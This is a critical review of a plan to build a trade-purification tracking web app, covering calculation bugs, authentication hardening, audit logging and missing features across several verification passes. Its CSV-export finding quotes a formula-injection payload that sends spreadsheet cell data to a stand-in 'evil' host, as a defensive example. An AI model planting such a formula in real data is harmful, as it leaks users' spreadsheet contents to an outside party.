# Plan Analysis — Trades Purification Tracker

## Context

This is an independent critical review of the implementation plan in this
same directory (start at [00-overview.md](00-overview.md) for the full
plan). Nothing has been built yet — the plan has not been executed past
Session 0's scaffolding step at the time this analysis was written.

**How this was produced:** a fresh subagent with no involvement in writing
the plan read all 12 plan files plus the two source-of-truth files
(`/home/adil/projects/trades/trades_template - current.csv` and
`/home/adil/projects/trades/averaging_down.md`) and was asked to actually
verify claims rather than take the plan's own comments at face value — e.g.
redoing the arithmetic behind `breakeven()`'s test cases by hand rather than
trusting the plan's assertion that they match `averaging_down.md`. The three
most severe findings below were independently hand-reverified before being
accepted into this document.

**Status:** **RESOLVED — all sections (1–5) fixed directly in the session files, 2026-07-13.** Every item below has been applied to its cited plan file. A fifth independent verification pass (2026-07-13) found 7 more items (noted below), also now fixed.

**Second verification pass, same day:** after the fixes above, a second independent fresh subagent re-read all 12 files and hand-re-verified the RESOLVED tags rather than trusting them (re-derived the `breakeven()` arithmetic again from `averaging_down.md`, re-traced every `nonCompliantPct` read/write site, checked the new `AuditLog`/bulk-import/transaction-edit/password-reset code for correctness bugs, not just the presence of a fix). All 21 original items held up. It found 6 NEW small bugs introduced by the fix pass itself, all now fixed:
1. **Session 7** `transaction-form.tsx`: editing a transaction rendered a blank date field — a raw `Date` object was passed as the HTML date input's seed value instead of a `"YYYY-MM-DD"` string. Fixed with `.toISOString().slice(0,10)`, cast back for TS since `transactionSchema` re-coerces it on submit.
2. **Session 7** `transaction-form.tsx`: per-field validation errors (`errors.shares`, `errors.date`, etc.) were never rendered, only `errors.root` — so leaving a required field blank showed no visible error. Fixed by rendering each field's own error, matching `company-form.tsx`'s existing pattern.
3. **Session 4** `new/page.tsx`: an unused `requireAuth` import in a `"use client"` file risked bundling server-only Prisma/NextAuth code into the client bundle. Removed, with an explicit warning added since two other files (Session 4's `edit-form.tsx`, Session 5's `users/new/page.tsx`) are instructed to mirror this file's pattern.
4. **Session 4** `edit/page.tsx`: same blank-date-input bug as #1, for the new `nextDividendDate` field. Same fix applied.
5. **Session 6**: stated prerequisites ("Sessions 1–3") didn't include Session 5, but `Sidebar` (built in this session) hardcodes links to `/admin/reports`/`/admin/audit-log`, both added in Session 5 — silently reintroducing the dead-link class of bug 4e was fixed to eliminate, just for two different routes. Prerequisites updated to require Session 5.
6. **Session 4** `DeleteCompanyButton`: treated any error from `deleteCompany` as the "confirm force-delete" case, and the force-retry had no error handling of its own. Fixed to only offer force-retry for the specific live-holdings message, and wrapped the retry in its own try/catch.

A 7th, lower-severity note (Session 7's `updateTransaction` doesn't use its `companyId` parameter in the query's `where` clause — harmless since `id` alone is unique, but worth a comment) was also addressed with a clarifying comment rather than a behavior change.

**Third verification pass, same day:** a third independent fresh subagent re-read all 13 files again, explicitly told what the first two passes already covered so it wouldn't just re-report the same items, and asked to hand-verify rather than trust the RESOLVED tags (re-derived `breakeven()`'s arithmetic a second time, hand-traced the bulk-import comma-split parser against a real comma-containing row from the source CSV, hand-traced `/admin/reports`' grouping logic with a 2-user scenario, and grepped every Session-N cross-reference against the file it actually points to). Everything already marked RESOLVED held up again. It found 4 more new bugs from the fix passes, all now fixed:
1. **Sessions 4 and 5** (`actions.ts` in both): every `auditLog.create()` call writing "no before/after value" used a bare `before: null`/`after: null` — Prisma's generated types for a nullable `Json?` field reject a plain `null` literal (it needs `Prisma.DbNull`), which would fail `tsc`/throw `PrismaClientValidationError` at runtime across most of the admin write surface (company create/reject/bulk-import, user create, password reset). Fixed by importing `Prisma` and using `Prisma.DbNull` in all 5 call sites.
2. **Session 2** (`src/types/next-auth.d.ts`): only `Session` was augmented, not `User`/`JWT` — so `authorize()`'s return literal (which includes `role`/`tokenVersion`, fields not on NextAuth's base `User` type) would fail TypeScript's excess-property check, and the `jwt` callback's `(user as {...})` casts existed specifically to paper over this same gap. Fixed by adding `User` and `JWT` module augmentations, and removed the now-unnecessary casts.
3. **Session 4** `updateCompany`'s audit log: `before.nonCompliantPct` (a live Prisma `Decimal` instance, which JSON-serializes as a *string* like `"10.00"`) was stored alongside `after.nonCompliantPct` (a plain `number` from Zod) in the same audit record — same field, two different JSON types across before/after. Fixed with `Number(before.nonCompliantPct)`.
4. **Session 6**: `HoldingsTable` links each row to `/companies/[id]`, a route that doesn't exist until Session 7 — an interim dead link in the same category as the already-fixed `/settings` gap, just left unflagged. Documented explicitly as an expected interim state (not worth building early, unlike `/settings`, since Session 7 is the very next session) rather than silently left as a surprise.

**Fourth verification pass, same day:** a fourth independent fresh subagent re-read all 13 files, was told exactly what passes 1–3 already covered so it wouldn't re-report them, and was asked to re-verify rather than trust the record (re-derived `breakeven()`'s arithmetic a third time, cross-checked real `nonCompliantPct` values from the source CSV against the plan's worked examples, traced every `toTxn()` call site's Prisma query to confirm `date` is actually returned post-fix). Everything already marked RESOLVED held up again, and it explicitly declined to report three things it considered non-bugs after investigating them (the apostrophe-on-negative-numbers CSV behavior, an `errors.root` reachability question, and a contrived PENDING-soft-delete edge case) rather than manufacturing findings — noted here since that kind of restraint is itself a useful signal. It found 3 more real bugs:
1. **Session 7**: `TransactionForm` doesn't clear `shares`/`pricePerShare`/`amount` when the user switches the `type` dropdown after filling some fields in (react-hook-form keeps unmounted field values by default) — `transactionSchema`'s `.refine()` only checks the *required* field for the chosen type is present, never that the *other* type's fields are absent, so a switched-type submission could persist a `DIVIDEND` row that also carries a stale `shares`/`pricePerShare`. Fixed server-side (defense in depth, consistent with the rest of the app) with a `normalizeTransactionFields()` helper in `actions.ts` that nulls the type-inappropriate fields before every `create`/`update`, applied in both `addTransaction` and `updateTransaction`.
2. **Session 2**: the third pass's `User`/`JWT` type augmentation fix only added `role`/`tokenVersion` to `User`, not `id` — NextAuth's base `User.id` is optional (`id?: string`), so `token.id = user.id` (assigning into the required `JWT.id: string`) would still fail `tsc --noEmit`. The old removed cast was doing double duty (satisfying both the `role`/`tokenVersion` excess-property check AND narrowing `id`) that the third pass's fix only addressed half of. Fixed with `token.id = user.id!` plus a comment explaining why the non-null assertion is safe (`authorize()` always returns a real id).
3. **Session 4**: `updateCompany`'s (and `createCompany`'s/`approveCompanyRequest`'s) audit log payloads omitted `nextDividendDate` even though the Global Constraints' audit-trail rule names "dividend info" explicitly and Session 1's revision note calls `nextDividendDate` exactly that — an admin could silently change it with zero audit trail while an adjacent `dividendPeriod` edit was fully logged. Fixed by adding `nextDividendDate` (as an ISO string, avoiding the same Decimal/number before-after type mismatch class the third pass already fixed once) to all three actions' audit payloads.

**Fifth verification pass, 2026-07-13:** a fifth independent review (this one) found 7 more items, all now fixed:
1. **Session 4**: `bulkImportCompanies` wrote a single audit log entry with only a count (`{ created: N, skippedCount: M }`) — no record of *which* companies were created, so a mistaken import has no per-row audit trail to reverse. Fixed by collecting `createdNames: string[]` during the import loop and including them in the `after.names` array.
2. **Session 4**: no admin layout existed — every admin page and Server Action guards individually, but there was no layout-level `requireAuth({ roles: ["ADMIN"] })` for defense in depth (the Global Constraints' auth rule explicitly requires defense in depth). Fixed with a minimal `src/app/admin/layout.tsx` added as Step 0.
3. **Session 3**: `dividendsTotal` (the function that sums all dividend amounts) had only one test case (two dividends) — no test for an empty or dividend-free transaction list. Every other exported function in the module had at least two test cases. Fixed by adding `"returns 0 when there are no dividend transactions"`.
4. **Session 9**: no global `not-found.tsx` or `error.tsx` existed anywhere in the plan — the app would default to Next.js's bare built-in "404" / "An error occurred" pages. Fixed by adding both as Step 5b with minimal shadcn/ui-styled implementations.
5. **Session 6**: `Sidebar` had no logout button — the only way to switch accounts was waiting for the JWT's 24h expiry or manually clearing cookies. Fixed with a `signOut` button at the bottom of the nav, using `next-auth/react`'s `signOut()` (made `Sidebar` a `"use client"` component — it now imports `next-auth/react`).
6. **Session 7**: `TransactionTable` had no empty-state message — an empty transaction list rendered a full table skeleton with zero rows, unlike `HoldingsTable` which shows a "No transactions yet." message. Fixed with an early return matching `HoldingsTable`'s pattern.
7. **Session 1/5/6**: `displayCurrency` was seeded as a `Setting` row in Session 1 but never read by any code — dead data. The Global Constraints said it "controls only the label shown next to figures," but no figure-displaying code ever queried it. Fixed by adding it to `getSettings()`'s return type (Session 5's `settings.ts` now queries both `transactionFee` and `displayCurrency`), reading it in Session 6's overview totals and Session 5's admin reports, and displaying `{displayCurrency}` next to monetary figures.

**How to use this alongside the plan:** each finding below cites the exact
plan file and section it applies to. When a finding is resolved, edit the
corresponding session file(s) directly (e.g. fix `breakeven()`'s code and
tests in `04-session-3-core-calculations-library-tdd.md`) — this analysis
file itself doesn't need to be kept in sync line-by-line, but consider
marking items done (`~~strikethrough~~` or a `RESOLVED` note) as they're
fixed, so a fresh agent picking this up later can tell current state from
history at a glance.

---

## 1. Correctness / Logic Bugs

### 1a. CRITICAL — `breakeven()` silently drops one transaction fee, and its own test contradicts itself — **RESOLVED**, fixed in `04-session-3-core-calculations-library-tdd.md`: transactionCount now includes +1 for the anticipated final sale; tests updated to 95.4/100.2/105.4.
**File:** `04-session-3-core-calculations-library-tdd.md` — `breakeven()` and its tests.

`averaging_down.md` defines transaction count as `2k+2` — explicitly
including the *not-yet-executed* final sale of `n0` ("(k+1) buys + k sells +
**1 final sell of n0**"). The plan's `breakeven()` only counts
`type === "BUY" || "SELL"` entries already present in the `txns` array — it
never adds the +1 for the anticipated future sale. Hand-verified against all
three non-trivial test cases:

- "matches the averaging_down.md worked pattern": doc formula gives
  `100 - (50-4)/10 = 95.4`. The plan's code/test asserts `95.3`.
- "reduces to P0 + fee*2/n0": the test's own docstring formula
  (`P0 + fee*2/n0` = `100 + 1*2/10` = `100.2`) does not match the number two
  lines below it in the same test (`toBeCloseTo(100.1, 5)`) — a
  self-contradiction inside a single test block, not just a doc mismatch.
- "a losing side trade pushes breakeven higher": doc formula gives `105.4`;
  test asserts `105.3`.

Every case is off by exactly `feePerTransaction / sharesHeld`. This is the
highest-value, highest-risk logic in the app per the plan's own description,
and `11-post-plan-verification.md` explicitly (and currently falsely) claims
"Confirm averaging_down.md's worked example numbers match breakeven()'s
output exactly (Session 3 Step 2's tests encode this)."

**Fix:** decide intentionally whether the future final sale's fee should be
recovered in the breakeven price (matching the doc:
`transactionCount = existingCount + 1`) or explicitly deviate from the doc
and correct the test comments/labels and the post-plan-verification claim
accordingly. Currently neither is true.

### 1b. CRITICAL — `nonCompliantPct` 0–1 vs 0–100: the company form as specified rejects most real CSV data — **RESOLVED**, fixed in `02-session-1-database-schema-prisma-seed.md` (Decimal(5,2), 0-100) and `05-session-4-...md` (schema/form/display all consistent 0-100); calculation call sites in `07-session-6-...md` and `09-session-8-...md` now divide by 100 at the read boundary.
**File:** `05-session-4-admin-company-management-crud-approval-queue.md` — `companySchema` + `company-form.tsx` + `new/page.tsx`.

- `companySchema.nonCompliantPct: z.coerce.number().min(0).max(1)` validates
  a 0–1 fraction.
- `company-form.tsx`'s input is labeled `"Non-compliant % (0–100)"` with no
  `/100` conversion anywhere in the given code.
- `new/page.tsx`'s submit handler passes `data` straight to
  `createCompany(data)` with no transform.
- The admin list display does
  `(Number(c.nonCompliantPct) * 100).toFixed(2)+"%"`, confirming the DB is
  meant to store the fraction.

An admin typing a realistic value from the source CSV (`4.94`, `3.96`,
`2.54`, etc. — nearly every non-zero row) gets a Zod validation error
because `4.94 > 1`. The plan itself flags this as unresolved ("**Pick one
approach and apply it consistently**... reconcile by dividing by 100...")
but leaves it as a TODO for whoever executes the session — directly
contradicting the plan's stated goal that each session is self-contained
and executable without added context.

**Fix:** resolve now, not at execution time. Simplest fix: store
`nonCompliantPct` as a 0–100 percentage (`Decimal(5,2)`) instead of a 0–1
fraction — this also fixes 1c below; only `calculations.ts`'s
`purifiableGains`/`purifiableDividends` callers need to divide by 100 once,
at the boundary.

### 1c. Decimal precision loss — **RESOLVED**, fixed alongside 1b: `Decimal(5,2)` covers 0.00-100.00 with the 2 decimal places the source data uses.
`nonCompliantPct Decimal @db.Decimal(6,3)` (3 decimal places) cannot exactly
represent a 2-decimal-place percentage stored as a fraction (`4.94%` →
`0.0494` needs 4 decimal places; it truncates to `0.049`). Minor in
isolation, but another reason to store as a percentage directly (see 1b).

### 1d. Sort-order contract is unenforced and already violated across sessions — **RESOLVED**, fixed in `04-session-3-...md`: `Txn` gained a `date` field, and `realizedGains`/`purifiableGains` sort internally now instead of trusting callers; Session 8's mark-purified page also given literal merged code instead of a prose instruction.
`04-session-3...md`'s doc comment says "Callers must pass txns pre-sorted by
date ascending" for `avgCost`/`realizedGains`/`purifiableGains` — there is
no runtime sort inside these functions. Session 6's `overview/page.tsx`
queries `orderBy: { date: "asc" }` (correct), but Session 7's
`companies/[id]/page.tsx` queries `orderBy: { date: "desc" }` for the
history table. Session 8 Step 5 then instructs execution to "compute the
current unpurified totals... same `toTxn` mapping approach as Session 6's
overview page" inside that same (desc-ordered) `page.tsx` — without giving
merged code. A plausible implementation reuses the already-fetched
desc-ordered array instead of re-querying ascending, silently producing
wrong average-cost-based purification numbers with no error thrown.

**Fix:** sort inside `calculations.ts` itself (defensive, cheap) rather than
relying on every call site to remember the contract, or at minimum give
Session 8 the literal merged `page.tsx` code instead of a prose
instruction.

### 1e. Global Constraints' soft-delete rule is violated by the plan's own example code — **RESOLVED**, fixed in `05-session-4-...md` (`updateCompany`/`approveCompanyRequest` now guard on `deletedAt: null`) and `08-session-7-...md` (`addTransaction` now guards on company `status: "APPROVED"` and `deletedAt: null`).
The constraint says "Every query against these models must filter
`deletedAt: null`." Violations found:
- Session 4's `updateCompany` and `approveCompanyRequest`:
  `prisma.company.update({ where: { id }, data })` has no
  `deletedAt: null` guard — only the page-level `notFound()` check
  (Session 4 Step 7) prevents editing a soft-deleted company, not the
  Server Action itself, contradicting the "defense in depth" principle the
  plan otherwise insists on for auth.
- Session 7's `addTransaction(companyId, input)`: never checks the target
  company is `APPROVED && deletedAt: null`. A user could add a transaction
  against a `PENDING`, `REJECTED`, or soft-deleted `companyId`. Since
  Session 6's dashboard filters `status: "APPROVED"` and Session 7's detail
  page 404s for non-approved/deleted companies, such a transaction becomes a
  permanently invisible, un-deletable orphan row.

### 1f. Interface contract mismatch — **RESOLVED**, fixed in `03-session-2-...md`: the "Interfaces produced" doc now describes the actual redirect-to-`/overview` behavior instead of a nonexistent 403 page.
Session 2's own "Interfaces produced" section states `requireAuth()`
"throws a redirect to `/login` if unauthenticated, or **renders a 403
page** if role mismatch." The actual code does `redirect("/overview")` on
role mismatch — no 403 page exists anywhere in the plan. Not a security
hole, but a documented-vs-actual mismatch in the one interface every later
session depends on.

---

## 2. Security Risks

### 2a. CSV formula-injection "mitigation" does not work as claimed — **RESOLVED**, fixed in `10-session-9-...md`: `toCsvField` now prefixes a leading apostrophe on `=+-@`/tab/CR before applying CSV quoting, and the test asserts the apostrophe property directly instead of just asserting quoting happened.
**File:** `10-session-9-csv-export-docs-prod-readiness.md` — `toCsvField()`.

The comment claims wrapping a value in double quotes "prevents CSV/formula
injection... Excel/Sheets treat a quoted leading char as literal text."
This is incorrect. CSV double-quoting is a delimiter/escaping mechanism
stripped by the CSV parser before the string reaches the spreadsheet's
cell-content interpreter — a field written as `"=SUM(A1)"` in the CSV file
is parsed into the cell content `=SUM(A1)`, evaluated as a formula exactly
as if unquoted. The actual (OWASP-recommended) mitigation is prefixing the
cell's *content* with a literal apostrophe (`'`) before a leading
`=`/`+`/`-`/`@` (and tab/CR), which spreadsheet apps treat as a "force text"
marker that survives CSV parsing. The plan's test only asserts the value
gets wrapped in quotes — it never verifies the actual security property.

**Exploitability:** `Company.name` comes partly from unsanitized
user-submitted company requests (Session 8's `requestCompany`) and flows
directly into every user's CSV export (`t.company.name` in the export
route) — a company approved with a name like
`=HYPERLINK("http://evil/steal?"&A1,"x")` would round-trip through export
unmitigated.

**Fix:** `if (/^[=+\-@\t\r]/.test(str)) str = "'" + str;` before applying
the existing comma/quote/newline escaping, and add a test that actually
checks for the leading apostrophe.

### 2b. No password change or reset flow anywhere — **RESOLVED**, fixed in `06-session-5-...md` (admin `resetUserPassword`) and `10-session-9-...md` (self-service `changePassword` on the `/settings` page). Both bump `tokenVersion`.
Session 5 gives admin `createUser` (sets initial password) and
`setUserActive` — there is no `updateUser`/password-change action, no
user-facing "change my password," no admin "reset a user's password."
`.env.example` in Session 0 even names the variable
`ADMIN_PASSWORD="change-me-on-first-login"`, implying a first-login change
flow that doesn't exist anywhere in the plan.

### 2c. `addTransaction` has no company-status guard (see also 1e) — **RESOLVED**, same fix as 1e.
A user can write a transaction against a pending/rejected/soft-deleted
company ID — this is a security/data-integrity gap, not just a UX one,
since it lets a user create data the app has no supported path to ever
show or clean up.

### 2d. Login lockout: TOCTOU race + timing side-channel — **RESOLVED**, fixed in `03-session-2-...md`: `authorize()` now always runs `bcrypt.compare` before checking lockout/active state (closes the timing side-channel), and uses an optimistic-concurrency `updateMany` keyed on the previously-read `failedAttempts` value (narrows, though doesn't fully eliminate, the race).
`failedAttempts`/`lockedUntil` are read-then-written non-atomically in
`authorize()` — concurrent parallel attempts against the same account could
exceed 5 failures before lockout takes effect. Separately, the locked-out
branch skips `bcrypt.compare` entirely, so a locked account responds
measurably faster than an unlocked-wrong-password account, letting an
attacker detect lockout state via timing. Low severity at this app's
invite-only, small-user-count scale, but worth noting since Session 2
frames rate-limiting as a deliberate hardening measure.

### 2e. `tokenVersion` is fetched but never used — **RESOLVED**, fixed in `03-session-2-...md`: `proxy.ts` now compares the session's `tokenVersion` against the DB value and forces re-login on mismatch; bumped on deactivation (Session 5), admin password reset (Session 5), and self-service password change (Session 9).
`src/proxy.ts` selects `tokenVersion` from the DB on every request but
never compares it to anything — the field only gets written (bumped on
deactivation in Session 5) and read, never checked. Flagged as deferred in
the plan's own text; since there's also no password-change flow (2b) to
give it purpose yet, it's currently dead weight — worth removing the unused
`select` or finishing the mechanism, not leaving it half-wired.

---

## 3. Missing Features / Gaps

### 3a. No CSV import / data-migration path for the ~80 existing companies — **RESOLVED**, fixed in `05-session-4-...md`: `bulkImportCompanies` action + `/admin/companies/import` paste-CSV page (naive comma-split, no quoted-field support — documented limitation for names containing a literal comma).
The stated goal is "replaces the `trades_template` Google Sheet," yet the
only way to populate companies is Session 4's one-at-a-time manual admin
form — which (per 1b) currently rejects most real values anyway. Session
1's seed script only creates the admin user + one `Setting` row, not any
`Company` rows. No bulk-import utility exists in the plan.

### 3b. Soft-deleting a company hides a user's real, existing holdings entirely, with no historical view — **RESOLVED**, fixed in `05-session-4-...md`: `deleteCompany` now blocks by default when live transactions exist, throwing a count of affected users; requires an explicit `force: true` re-call (surfaced as a confirm dialog in `DeleteCompanyButton`) to proceed anyway.
Session 6's dashboard filters `status: "APPROVED", deletedAt: null`, and
Session 7's detail page 404s on `deletedAt`. If an admin soft-deletes a
company a user holds a position in, that user's shares, unpurified gains,
and dividends silently vanish from every dashboard total and become
permanently unreachable through any UI — even though the `Transaction` rows
still exist (per the "never hard-delete" rule). No warning is shown to the
admin when deleting a company with live user transactions, and no
historical/read-only view exists for a deleted company's data.

### 3c. No transaction edit — only add/delete — **RESOLVED**, fixed in `08-session-7-...md`: `updateTransaction` action + inline edit mode in `TransactionForm`/`TransactionTable`.
Fixing a typo'd share count or price requires delete + re-add. Workable but
real friction in a financial-entry tool where fat-finger errors are common.

### 3d. Rejected company requests permanently block that ticker — **RESOLVED**, fixed in `05-session-4-...md`: `rejectCompanyRequest` now hard-deletes the pending row (documented exception to the soft-delete rule in Global Constraints) instead of flipping `status`, freeing the ticker.
`requestCompany`/`createCompany` share a global unique constraint on
`ticker`. `rejectCompanyRequest` only flips `status` to `REJECTED` — the row
(and its unique ticker) is never cleaned up or made re-requestable. A
mistaken rejection permanently prevents that ticker from ever being added
again, admin included, without manual DB intervention.

### 3e. No versioning/audit trail for config that retroactively changes historical numbers — **RESOLVED**, fixed in `02-session-1-...md` (`AuditLog` model), `05-session-4-...md` (company create/update/approve/reject/delete write entries), `06-session-5-...md` (user create/activate/deactivate/password-reset and `transactionFee` changes write entries, plus an `/admin/audit-log` view page). Note: this records *that* and *when* a value changed, not a per-transaction snapshot of the rate that applied historically — that finer-grained versioning is called out as a remaining known simplification in `AGENTS.md` (Session 9), not silently dropped.
`Company.nonCompliantPct` and the global `transactionFee` `Setting` are read
live at calculation time (acknowledged in the plan's own draft `AGENTS.md`
as a "known simplification"). Because `purifiableGains`/`purifiableDividends`
only exclude *purified* transactions (not date-bounded ones), any old
unpurified transaction silently recomputes against whatever the *current*
percentage/fee is if an admin edits it later — with zero record that a
change occurred, when, or what the old value was. Reasonable as a v1
trade-off, but there's no audit log at all for any admin action (user
deactivation, company edits, fee changes) — worth a conscious decision, not
a silent deferral, given the app's whole purpose is producing figures a
user may rely on.

### 3f. No admin aggregate/reporting view across users — **RESOLVED**, fixed in `06-session-5-...md`: `/admin/reports` sums purification totals per user and as a grand total.
Admin can manage the user list and company list, but has no way to see
combined purification totals across all users.

### 3g. No currency modeling — **RESOLVED as an explicit, enforced decision** (not full multi-currency support, which was never requested): Global Constraints in every session file now state the single-currency assumption explicitly, and `02-session-1-...md` adds a `Setting` row `displayCurrency` for the label shown next to figures. If the portfolio ever spans multiple settlement currencies, this assumption is documented as needing revisiting — it is no longer an unstated gap.
Neither `Transaction` nor `Company` has a currency field, and the dashboard
sums `gainsToPurify`/`dividendsToPurify` across all companies as one number.
The source CSV's tickers span multiple home markets (US, Japanese,
Australian, German companies via `-GY`/`-GF` suffixes); if these aren't
uniformly the same settlement currency, portfolio-wide totals are
unvalidated as meaningful. Worth explicitly confirming a single-currency
assumption before building — it's baked into the schema with no easy
retrofit.

### 3h. Loose "dividend period" text loses the source sheet's reminder/date-tracking utility — **RESOLVED**, fixed in `02-session-1-...md`: added optional structured `Company.nextDividendDate` alongside the existing free-text `dividendPeriod` (kept, per the original explicit free-text decision) and surfaced in the admin form/list (`05-session-4-...md`).
The sheet tracks "nearest dividend date," "yet to come," and a "LAST
UPDATED" timestamp per company. `Company.dividendPeriod` is free text with
no structured date and no reminder mechanism — a legitimate downgrade
versus the sheet, worth a conscious decision rather than a silent drop.

---

## 4. Structural / Architectural Weak Points

### 4a. Test coverage doesn't match the plan's own risk assessment — **RESOLVED**, fixed in `03-session-2-...md`: added `tests/lib/rate-limit.test.ts` (pure functions, tested like `calculations.ts`) and `tests/lib/auth-guard.test.ts` (mocks `@/lib/auth` to cover `requireAuthApi`'s 401/403/pass-through paths — `requireAuth`'s `redirect()` path remains manually verified, noted as harder to unit test).
Only `calculations.ts` and `export-utils.ts` get unit tests.
`rate-limit.ts` (`isLockedOut`/`nextLockoutState`) is pure,
zero-dependency, and trivially testable exactly like `calculations.ts` —
yet untested, despite being the account-lockout security mechanism. More
notably: the auth-guard role-gating that Global Constraints calls a "hard
rule... cites real incidents caused by skipping it" has zero automated
regression coverage anywhere — enforcement relies entirely on manual
"verify as admin" steps per session.

### 4b. `export-utils.test.ts`'s existing test is itself evidence of the process gap — **RESOLVED**, same fix as 2a: the test now asserts the leading-apostrophe property directly.
The "neutralizes leading formula characters" test (see 2a) asserts an
implementation detail (double-quoting) rather than the actual security
property, and nobody caught that the described mitigation doesn't work —
illustrates why "add more tests" isn't the fix so much as "test the
property you actually claim to guarantee."

### 4c. `getSettings()`'s in-memory 60s TTL cache is a premature-optimization footgun — **RESOLVED as documented**, fixed in `06-session-5-...md`: an explicit in-code comment now states the single-instance-only limitation directly above the cache implementation (not fully re-architected, since the plan's deployment target is still single-container — the risk is now visible rather than implicit).
A single-row Postgres lookup doesn't need caching at this scale, and the
module-level cache variable isn't process-shared — if the app is ever
deployed with more than one instance, different instances would serve
stale `transactionFee` values independently for up to 60s after an admin
change, with no cross-instance invalidation. Low priority given the current
single-container deployment target, but worth a code comment explaining the
constraint so a future scale-up doesn't quietly reintroduce inconsistency.

### 4d. Unverifiable "matches sibling app conventions" claims — **RESOLVED**, fixed in `06-session-5-...md` (removed the `bake_em_up` `Setting`-model claim) and `08-session-7-...md` (removed the `hisab`/`cookbook` ownership-scoping claim) — both patterns are now explained standalone, without citing an unverifiable external repo.
Several code comments assert a pattern "matches `bake_em_up`'s `Setting`
model usage" or "the ownership-scoping pattern from `hisab`/`cookbook`" —
these sibling apps aren't present in this repo, so neither a reviewer nor a
fresh agent executing a session in isolation can actually verify the claim;
it has to be trusted. Not a defect in the plan's logic, but it undercuts the
"each session is self-contained and independently verifiable" goal stated
in the overview.

### 4e. `/settings` link 404s for most of the build — **RESOLVED**, fixed in `07-session-6-...md`: a minimal `/settings` page is now built in Session 6 itself (not deferred to Session 9), so the sidebar link never dead-ends; Session 9 extends the same file rather than creating it.
`Sidebar` (Session 6) links to `/request-company` and `/settings`, but
`(dashboard)/settings/page.tsx` isn't created until Session 9 Step 5
("create if Session 5 didn't add it" — it doesn't). So for the entire span
of Sessions 6–8, every user-facing page renders a sidebar with a dead link,
unlike the `/overview` 404 in Session 2 which the plan explicitly calls out
as an expected interim state.

---

## 5. Other Notable Issues

### 5a. Date-only input parsed as UTC will display off by one day for negative-UTC-offset users — **RESOLVED**, fixed in `08-session-7-...md`: `transaction-table.tsx` now formats dates with UTC getters (`formatUtcDate`) instead of `toLocaleDateString()`.
`transactionSchema`'s `date: z.coerce.date()` parses an HTML
`<input type="date">` value like `"2026-07-13"` as UTC midnight.
`transaction-table.tsx` then renders `t.date.toLocaleDateString()` in the
browser's local timezone. A user in any negative-UTC-offset timezone (e.g.
US) who picks `2026-07-13` will see `7/12/2026` displayed back — an
easily-triggered off-by-one that would cause real confusion when
cross-checking against broker statements. Sorting by `date` in the DB stays
correct (the instant is still consistently before/after others); only the
*display* is wrong.

### 5b. Session 6's holdings-table company order is non-deterministic — **RESOLVED**, fixed in `07-session-6-...md`: added `orderBy: { name: "asc" }` to the company query, matching Session 4's admin list.
`overview/page.tsx`'s `prisma.company.findMany({ where: {...}, include:
{...} })` has no `orderBy`, unlike Session 4's admin list
(`orderBy: { name: "asc" }`). Minor polish inconsistency, easy to fix.

### 5c. Row 81 of the source CSV (`xylem inc.`) already contains `#VALUE!` Excel error artifacts — **RESOLVED as a documented verification step**: `10-session-9-...md`'s Step 12 now explicitly calls out cross-checking a handful of *other* rows' `nonCompliantPct` values after bulk import, since row 81 can't serve as a clean gold-row reference.
Confirms the sheet is genuinely broken in places and validates the
motivation for the rebuild, but also means there's no clean "gold" row to
sanity-check a migration import against — worth a manual cross-check plan
for at least a few companies' numbers once real data is loaded, independent
of the unit tests.

---

## Bottom line

**Update, 2026-07-13: all findings below have been fixed directly in the session files.** The original assessment stands as a historical record of what was wrong and why — see each item's **RESOLVED** tag above for exactly which file fixed it. Summary of what changed:

- The three **Critical** items (breakeven's fee-count bug, the `nonCompliantPct` unit mismatch, the non-functional CSV formula-injection mitigation) are fixed, with their own tests now verifying the actual property that matters rather than an implementation detail.
- All five **Security** items are fixed: real formula-injection protection, both admin-initiated and self-service password change, the missing company-status guard, reduced lockout race/timing exposure, and `tokenVersion` now actually enforced end-to-end.
- All eight **Missing Features** items were fully implemented (not just documented as deferred), per the user's explicit choice: bulk CSV import, delete-with-live-holdings protection, transaction editing, ticker release on rejection, a real audit log with an admin view, a cross-user reporting page, an explicit enforced single-currency assumption, and a structured dividend-date field.
- All five **Structural** items are fixed: new test coverage for `rate-limit.ts` and `auth-guard.ts`, a security-property-verifying export test, an explicit cache-limitation comment, removal of unverifiable sibling-app claims, and the dead `/settings` link closed by building it a session earlier.
- All three **Other** items are fixed: UTC-consistent date display, deterministic holdings-table ordering, and an explicit gold-row-substitute verification step.

The fifth verification pass found and fixed 7 more items (not in the original 5 sections above): bulk-import per-row audit logging, a missing admin layout, a `dividendsTotal` empty-state test, global `not-found.tsx`/`error.tsx`, a logout button in the sidebar, a `TransactionTable` empty state, and `displayCurrency` being dead data (was seeded but never read).

Nothing has been built yet (Session 0 hasn't run) — this was a plan-only pass. The next step is executing Session 0 onward against the now-corrected plan.
